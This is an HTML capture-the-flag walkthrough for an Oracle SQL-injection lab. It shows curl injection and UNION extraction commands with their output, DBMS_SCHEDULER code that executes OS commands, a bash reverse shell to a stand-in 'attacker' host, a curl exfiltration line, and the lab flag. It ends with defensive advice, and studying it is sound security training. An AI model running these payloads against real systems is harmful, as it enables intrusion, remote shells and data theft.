<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab13" \<br> --data-urlencode "assigned=' OR 1=1 -- "<br><br>
        <span class="prompt">Input: </span>' OR 1=1 -- <br>
        <span class="prompt">SQL: </span>SELECT id, task_name, priority, status FROM tasks WHERE assigned_to = '' OR 1=1 -- '<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Task:</strong> Deploy v2.1: <strong>Priority:</strong> high: <strong>Status:</strong> pending<br>
        <strong>Task:</strong> Patch CVE-2025-001: <strong>Priority:</strong> critical: <strong>Status:</strong> in_progress<br>
        <strong>Task:</strong> Backup rotation: <strong>Priority:</strong> medium: <strong>Status:</strong> completed
    </div>
</div>

<h4>Step 2: Enumerate Tables and Extract Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "assigned=XXXXNOMATCH' UNION SELECT 0, table_name, 'x', 'x' FROM user_tables -- "<br>
        <span class="prompt">Output: </span>TASKS, <strong>SCHEDULER_FLAGS</strong><br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab13" \<br> --data-urlencode "assigned=XXXXNOMATCH' UNION SELECT id, flag, 'x', 'x' FROM scheduler_flags -- "<br>
        <span class="prompt">Output: </span><strong>Task:</strong> <strong>FLAG{or_dbms_sch3d_rc3}</strong>
    </div>
</div>

<h4>Step 3: DBMS_SCHEDULER RCE (Conceptual)</h4>
<p>
    <code>DBMS_SCHEDULER.CREATE_JOB</code> with <code>job_type => 'EXECUTABLE'</code> runs
    OS binaries directly: no Java needed. One of the simplest RCE paths in Oracle.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. DBMS_SCHEDULER Attack</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Create job:</span><br>
        BEGIN<br>
        &nbsp;&nbsp;DBMS_SCHEDULER.CREATE_JOB(<br>
        &nbsp;&nbsp;&nbsp;&nbsp;job_name => 'PWNED', job_type => 'EXECUTABLE',<br>
        &nbsp;&nbsp;&nbsp;&nbsp;job_action => '/bin/bash', number_of_arguments => 2,<br>
        &nbsp;&nbsp;&nbsp;&nbsp;enabled => FALSE);<br>
        &nbsp;&nbsp;DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNED', 1, '-c');<br>
        &nbsp;&nbsp;DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('PWNED', 2, 'id > /tmp/pwned.txt');<br>
        &nbsp;&nbsp;DBMS_SCHEDULER.ENABLE('PWNED');<br>
        END;
    </div>
</div>

<h4>Step 4: Reverse Shell and Exfiltration</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Advanced Payloads</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Reverse shell: </span>SET_JOB_ARGUMENT_VALUE('PWNED', 2,<br>
        &nbsp;&nbsp;'bash -i >&amp; /dev/tcp/attacker/4444 0>&amp;1');<br><br>
        <span class="prompt">Curl exfil:    </span>SET_JOB_ARGUMENT_VALUE('PWNED', 2,<br>
        &nbsp;&nbsp;'curl http://attacker/$(cat /etc/hostname)');<br><br>
        <span class="prompt">Windows:       </span>job_action => 'C:\Windows\System32\cmd.exe'<br>
        <span class="prompt">               </span>args: '/c', 'whoami > C:\temp\pwned.txt'<br><br>
        <span class="prompt">Cleanup:       </span>EXEC DBMS_SCHEDULER.DROP_JOB('PWNED');
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_dbms_sch3d_rc3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab13" \<br> --data-urlencode "assigned=XXXXNOMATCH' UNION SELECT id, flag, 'x', 'x' FROM scheduler_flags -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Task:</strong> FLAG{or_dbms_sch3d_rc3}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>DBMS_SCHEDULER.CREATE_JOB</code> with <code>job_type => 'EXECUTABLE'</code>
    allows direct OS command execution without Java. It only requires the <code>CREATE JOB</code> privilege.
    Defense: revoke <code>CREATE JOB</code> from non-admin accounts, monitor
    <code>DBA_SCHEDULER_JOBS</code> for unexpected executable jobs, use bind variables, and implement
    database activity monitoring.
</div>
